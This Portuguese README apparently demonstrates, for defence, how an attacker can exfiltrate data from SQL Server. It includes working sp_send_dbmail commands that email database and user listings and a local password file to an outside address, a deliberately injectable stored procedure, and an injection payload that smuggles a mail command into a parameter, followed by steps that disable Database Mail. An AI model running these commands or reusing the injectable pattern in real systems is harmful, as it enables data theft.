## Descrição do Script

Este script simula ações maliciosas que um invasor pode realizar em um servidor SQL Server, como o envio de informações sensíveis via e-mail e a execução de SQL Injection para exfiltrar dados.

### 1. **Envio de Informações Sigilosas via E-mail**
   - A primeira parte do script utiliza a stored procedure `msdb.dbo.sp_send_dbmail` para enviar e-mails contendo informações sigilosas extraídas do banco de dados. A consulta retorna nomes de bancos de dados, usuários do servidor e tabelas presentes no sistema.

### 2. **Envio de Arquivos Locais do Servidor**
   - A segunda execução do `sp_send_dbmail` envia um e-mail com um arquivo em anexo. Neste caso, o arquivo `C:\Senha muito importante.txt` é anexado ao e-mail.

### 3. **SQL Injection para Envio de Informações Sigilosas**
   - Uma stored procedure chamada `dbo.stpConsulta_Tabela` é criada ou alterada para realizar uma consulta no banco de dados com base no parâmetro fornecido. Se um SQL Injection for realizado no parâmetro `@Nome`, o comando malicioso será executado, e a informação sensível será enviada para o e-mail do invasor.

### 4. **Desabilitação de Envio de E-mail no Servidor**
   - Para evitar que futuras execuções de SQL Injection ou outros comandos maliciosos consigam enviar e-mails, o script desabilita a configuração de `Database Mail` e `SQL Mail` no servidor, utilizando a procedure `sp_configure`. Essa ação impede a execução de funções relacionadas ao envio de e-mails no SQL Server.

```SQL
-- Envia informações sigilosas para o invasor
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'teste@gmail.com', -- varchar(max)
    @subject = N'Teste', -- nvarchar(255)
    @query = N'SELECT name FROM sys.databases; select name from sys.server_principals;select name from sys.tables;',
	@query_result_header = 1,
	@query_result_width = 255,
	@query_result_separator = '|',
	@attach_query_result_as_file = 0
```   

```SQL
-- Envia arquivos locais do servidor
EXEC msdb.dbo.sp_send_dbmail
    @recipients = 'teste@gmail.com', -- varchar(max)
    @subject = N'Teste anexo', -- nvarchar(255)
	@body = 'Teste',
	@body_format = 'HTML',
    @file_attachments = 'C:\Senha muito importante.txt'
```

```SQL
-- Utiliza um SQL Injection para enviar informações sigilosas
CREATE OR ALTER PROCEDURE dbo.stpConsulta_Tabela (
	@Nome VARCHAR(MAX)
)
AS
BEGIN

	DECLARE @Comando VARCHAR(MAX) = 'SELECT * FROM sys.tables WHERE [name] = ''' + @Nome + ''''
	EXEC(@Comando)

END

EXEC dbo.stpConsulta_Tabela 'Teste'

EXEC dbo.stpConsulta_Tabela 'Teste'' OR 1=1;EXEC msdb.dbo.sp_send_dbmail
    @recipients = ''teste@gmail.com'',
    @subject = N''Teste'',
    @query = N''SELECT name FROM sys.databases; select name from sys.server_principals;select name from sys.tables;'',
	@query_result_header = 1,
	@query_result_width = 255,
	@query_result_separator = ''|'',
	@attach_query_result_as_file = 0 --'
```













-- Desabilita o envio de e-mail no servidor
sp_configure 'show advanced options', 1;
GO

RECONFIGURE
GO

sp_configure 'Database Mail XPs', 0;
GO

sp_configure 'SQL Mail XPs', 0;
GO

RECONFIGURE
GO